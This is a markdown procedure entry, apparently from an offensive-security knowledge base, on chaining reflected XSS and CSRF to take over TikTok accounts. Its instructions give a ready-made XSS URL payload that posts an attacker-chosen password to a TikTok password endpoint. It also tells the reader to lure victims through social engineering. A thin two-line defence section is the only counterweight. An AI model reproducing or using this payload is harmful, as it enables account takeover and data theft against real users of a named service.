---
id: dae33bba-4d10-4255-bb67-b8fd0471d24b
name: Chain XSS and CSRF for Account Takeover
type: procedure
verified: false
submitted: true
created_at: '2025-12-11T06:10:22.184Z'
updated_at: '2025-12-11T06:10:22.184Z'
tactics:
  - '[[Persistence]]'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - xss
  - csrf
  - account-takeover
commands:
  - '[[commands/fuzz-url-parameter]]'
  - '[[commands/inject-xss-payload]]'
  - '[[commands/test-csrf-endpoint]]'
  - '[[commands/execute-csrf-payload]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: advanced
impact_level: critical
detection_risk: high
validated: true
mitre_tactics:
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1059.007]]'
  - '[[T1190]]'
---

# Chain XSS and CSRF for Account Takeover

## Summary

This procedure combines reflected XSS with CSRF by injecting a CSRF-triggering payload into the XSS vector, enabling one-click account takeover.

## Description

Embed the CSRF JS into the XSS parameter for automatic execution when a victim visits the crafted URL. This targets TikTok accounts, resulting in password changes and potential data theft.

## Requirements

1. Confirmed XSS and CSRF vulnerabilities
2. Crafted payload
3. Social engineering to lure victim

## Defense

Defensive measures and detection strategies:

- Fix both XSS and CSRF issues
- Implement web application firewalls (WAF)

## Objectives

1. Achieve automated takeover
2. Exfiltrate data if possible
3. Validate full chain

## Instructions

### Step 1: Combine Payloads

**Context**: Inject CSRF JS into XSS parameter.

**Command** ([[commands/inject-xss-payload]]):
```bash
https://www.tiktok.com/?param=<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://www.tiktok.com/api/password/set');xhr.send('new_password=attacker123');</script>
```

> This executes the CSRF on page load.

### Step 2: Deliver and Validate

**Context**: Send URL to victim and confirm takeover.

**Command** ([[commands/execute-csrf-payload]]):
```bash
# Monitor for successful password change
```

> Attempt login with new credentials.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/inject-xss-payload]]
- [[commands/execute-csrf-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[commands/inject-xss-payload]]
- [[commands/test-csrf-endpoint]]
- [[account-takeover]]
